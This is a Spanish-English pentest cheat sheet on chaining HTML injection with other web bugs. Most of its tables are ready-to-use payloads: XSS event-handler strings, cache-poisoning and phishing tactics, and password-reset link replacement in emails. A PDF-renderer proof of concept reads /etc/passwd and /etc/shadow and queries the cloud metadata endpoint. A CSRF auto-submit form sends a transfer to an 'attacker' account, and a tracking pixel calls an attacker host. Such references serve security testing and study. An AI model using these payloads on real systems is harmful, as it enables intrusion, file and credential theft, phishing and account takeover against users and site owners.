---
aliases:
  - HTML Injection Chains
  - HTML to XSS
  - HTML Email Injection
  - PDF Template Injection
tags:
  - type/cheatsheet
  - vuln/html-injection
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTML Injection]]'
  - '[[Cross-Site Scripting (XSS)]]'
  - '[[Web Cache Poisoning]]'
  - '[[Server-Side Template Injection (SSTI)]]'
---
# HTML Injection - Chains con Otras Vulns

***

## HTML to XSS Upgrade

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | If filter blocks `<script>` but allows `<img>`, atacante busca event handlers en allowed tags | Privesc HTML to XSS. |
| Image onerror | `<img src=x onerror=alert(1)>` | If onerror not filtered. |
| Image onload | `<img src=valid onload=alert(1)>` | Triggered on successful load. |
| SVG onload | `<svg onload=alert(1)>` | SVG often allowed but events triggered. |
| Body onload | `<body onload=alert(1)>` | Less common but possible. |
| Iframe srcdoc | `<iframe srcdoc="<script>alert(1)</script>">` | Different context. |
| Object data | `<object data="javascript:alert(1)">` | Edge. |
| Embed src | `<embed src="javascript:alert(1)">` | Same. |
| Form formaction | `<form><button formaction="javascript:alert(1)">x</button></form>` | Button-based. |
| Math element | `<math><mtext>...<a href="javascript:alert(1)">x</a></mtext></math>` | Lesser known. |
| Animate element | `<svg><animate attributeName=href values=javascript:alert(1)>` | Animation events. |
| Combine con CSP bypass | If `unsafe-inline` allowed, inline events execute | CSP-aware. |
| `nonce` reuse abuse | If nonce predictable o leakeable | CSP nonce bypass. |
| `eval()` reachable via `unsafe-eval` | Combine | CSP. |
| Stored XSS via stored HTML | Stored injection persistente | High impact. |
^htmli-chain-xss

___

## Cache Poisoning Combo

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | HTML injection en field unkeyed (header reflejado) → cached response → todos los users see injection | Mass impact. |
| Reflected via `X-Forwarded-Host` | App reflects header value en `<base href>` o canonical | Atacante poisons. |
| Reflected via Cookie | Cookie reflected en page → cache poison via Set-Cookie | Edge. |
| Combine con Param Miner | Discover unkeyed input → inject HTML | Standard workflow. |
| Stored-effect via cache TTL | Even sin DB store, persiste por TTL del cache | Persistencia. |
| Mass phishing via cache | Cache poisoned con fake login form | High impact. |
| CDN-level cache | Cloudflare / Akamai cache poisoned | Wide reach. |
| Multi-tier cache | Origin caches → CDN caches → all users served poisoned | Cascading. |
| Combine con HRS | Smuggle response que cachea con HTML inject | Chain. |
| Time-window cache poison | Atacante times poisoning con high-traffic moments | Maximum impact. |
^htmli-chain-cache

___

## HTML Email Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App sends emails con user input embedded en HTML body. No sanitization → email phishing. | Spear phishing vector. |
| Welcome email | `<a href="https://attacker">Confirm</a>` en welcome email | Trust transfer. |
| Password reset email | Replace reset link con attacker's | High impact ATO. |
| Notification email | Insert phishing en routine notification | Stealth. |
| Email subject HTML | Some clients render subject HTML | Edge. |
| Email signature HTML | User signature reflected to recipients | Stored. |
| Newsletter HTML | Mass-distributed | Wide reach. |
| Tracking pixel | `<img src="//attacker/track">` en email | User tracking. |
| Outlook conditional | `<!--[if mso]>` Outlook-only | Edge case targeting. |
| Email client URL handlers | `mailto:`, `tel:`, custom scheme handlers | Mobile. |
| Email-based MFA bypass | If email visible content includes auth code | Edge. |
| HTML email phishing | Standard | Standard. |
| Combine con SES / SendGrid | If service permits HTML | Common. |
^htmli-chain-email

___

## PDF / Print Template Injection

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | App generates PDF / print view from user content via wkhtmltopdf, Chromium headless, etc. HTML inject → PDF render con malicious content. | Server-side render. |
| File read via `<iframe>` | `<iframe src="file:///etc/passwd">` | wkhtmltopdf reads file system. |
| File read via `<img>` | `<img src="file:///etc/passwd">` | Same. |
| File read via `<link>` | `<link href="file:///...">` | CSS load. |
| SSRF via `<iframe>` | `<iframe src="http://internal:8080">` | Internal access. |
| SSRF via `<img>` | Same. | Standard. |
| RCE en wkhtmltopdf vulnerable versions | CVE-specific | Per-version. |
| JavaScript en PDF | `<script>...</script>` if engine renders JS | Headless Chromium. |
| Load attacker's CSS/JS | External resources loaded server-side | Combine. |
| Read internal pages | Atacante's HTML loads internal-only pages | Auth-context disclosure. |
| Combine con SSRF + file read | Multi-stage | Standard. |
| Print preview abuse | If app uses CSS `@media print { ... }` | Conditional render. |
| Receipt / invoice generation | Common stack | E-commerce. |
^htmli-chain-pdf

### PoC PDF SSRF + file read

```html
<!-- Atacante envía como input -->
<iframe src="file:///etc/passwd" width="100%" height="500"></iframe>
<img src="file:///etc/shadow">
<iframe src="http://169.254.169.254/latest/meta-data/" width="100%" height="500"></iframe>

<!-- App genera PDF/print de la HTML con wkhtmltopdf
     Engine carga file:// y http:// internal URLs
     Resultados aparecen en el PDF generado
     Atacante descarga PDF → ve files/internal data -->
```

___

## CSRF + HTML Injection Chain

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concept | HTML inject en authenticated context → form auto-submit con CSRF action | High impact ATO. |
| Auto-submit form en stored injection | `<form id="x" action="legit/transfer"><input name="to" value="attacker"></form><script>document.getElementById('x').submit()</script>` | Direct CSRF. |
| Image-based CSRF | `<img src="legit/api/delete?id=42">` | GET-based CSRF. |
| iframe-based CSRF | `<iframe src="legit/admin/grant?user=attacker">` | iframe loads. |
| Form submit simulation | `<form action="legit/critical-action"><button>Click</button></form>` | User-triggered. |
| Stored form en profile | Persistent stored form en victim's view | Stored CSRF. |
| Combine con SameSite=Lax | GET-based CSRF still works | Pattern. |
| Combine con cookie disclosure | HTML inject leaks via Referer + CSRF | Multi-vector. |
| Cross-origin same-site abuse | Subdomain HTML inject + cross-subdomain CSRF | Stack chain. |
| Stored XSS-CSRF combo | XSS read CSRF token + perform action | Standard. |
| HTML inject = XSS = CSRF | If escala a XSS → autonomous CSRF | Chain. |
^htmli-chain-csrf

***
